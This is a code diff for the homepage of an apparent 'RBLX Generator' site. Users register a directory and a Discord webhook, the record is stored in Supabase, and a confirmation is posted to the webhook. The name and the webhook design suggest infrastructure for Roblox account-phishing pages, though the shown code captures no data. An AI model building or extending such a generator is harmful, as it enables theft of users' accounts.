@@ -13,21 +13,9 @@ export default function HomePage() {
       return;
     }
 
-    setStatus("⏳ Creating your site...");
+    setStatus("⏳ Creating site...");
 
-    // Check if directory already exists
-    const { data: existing } = await supabase
-      .from("websites")
-      .select("*")
-      .eq("directory", directory)
-      .single();
-
-    if (existing) {
-      setStatus("❌ Error — directory already exists!");
-      return;
-    }
-
-    // Insert new record
+    // Insert new record in Supabase
     const { data, error } = await supabase
       .from("websites")
       .insert([{ directory, webhook_url: webhook }]);
@@ -37,27 +25,25 @@ export default function HomePage() {
       return;
     }
 
+    // Send Discord webhook message
     try {
-      // Send webhook message automatically
       await fetch(webhook, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          content: `✅ Your site "${directory}" has been successfully created!\n🌐 Visit: https://rblx-forcer.vercel.app/${directory}`,
+          content: `✅ Your site **${directory}** has been successfully created!\n🌐 Visit it here: https://rblx-forcer.vercel.app/${directory}`,
         }),
       });
     } catch (err) {
-      console.error("⚠️ Webhook send failed", err);
+      console.error("Webhook send failed", err);
     }
 
-    setStatus("✅ Success! Redirecting...");
-    setTimeout(() => {
-      window.location.href = `/${directory}`;
-    }, 1500);
+    // Redirect user to their page
+    window.location.href = `/${directory}`;
   };
 
   return (
-    <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-br from-blue-600 to-purple-700 text-white">
+    <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-br from-blue-500 to-purple-600 text-white">
       <h1 className="text-3xl font-bold mb-6">RBLX Generator</h1>
 
       <div className="bg-white/10 p-6 rounded-2xl shadow-xl w-80 flex flex-col gap-3">
